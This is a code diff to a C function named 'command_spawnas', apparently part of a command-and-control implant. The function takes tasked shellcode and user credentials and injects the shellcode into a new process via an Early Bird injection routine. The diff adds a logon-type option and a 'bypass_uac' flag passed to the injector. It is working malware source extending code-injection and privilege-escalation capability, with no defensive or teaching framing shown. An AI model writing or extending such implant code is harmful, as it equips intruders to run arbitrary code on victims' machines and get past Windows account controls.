@@ -72,6 +72,8 @@ void command_spawnas(char *task_id, char *params) {
     char domain[256]       = {0};
     char password[256]     = {0};
     int  sc_chunk_size     = SPAWNAS_CHUNK_SIZE;
+    int  logon_type        = 2;
+    int  bypass_uac        = 0;
 
     extract_json_string(params, "file",          file_id,      sizeof(file_id));
     extract_json_string(params, "shellcode_md5", expected_md5, sizeof(expected_md5));
@@ -81,6 +83,21 @@ void command_spawnas(char *task_id, char *params) {
     {
         int v = spawnas_extract_int(params, "sc_chunk_size", 0);
         if (v > 0) sc_chunk_size = v;
+    }
+    {
+        int v = spawnas_extract_int(params, "logon_type", 0);
+        if (v > 0) logon_type = v;
+    }
+    {
+        /* json_get_bool not available here; parse inline */
+        const char *bp = strstr(params, "\"bypass_uac\"");
+        if (bp) {
+            const char *vp = strchr(bp, ':');
+            if (vp) {
+                while (*++vp == ' ' || *vp == '\t');
+                bypass_uac = (strncmp(vp, "true", 4) == 0) ? 1 : 0;
+            }
+        }
     }
 
     if (!file_id[0]) {
@@ -179,8 +196,9 @@ void command_spawnas(char *task_id, char *params) {
     char            injerr[256] = {0};
     if (!earlybird_inject_asuser(shellcode, shellcode_len,
                                  username,
-                                 domain[0] ? domain : ".",
+                                 domain[0] ? domain : NULL,
                                  password,
+                                 logon_type, bypass_uac, 0,
                                  &inj, injerr, sizeof(injerr))) {
         SecureZeroMemory(shellcode, shellcode_len);
         free(shellcode);
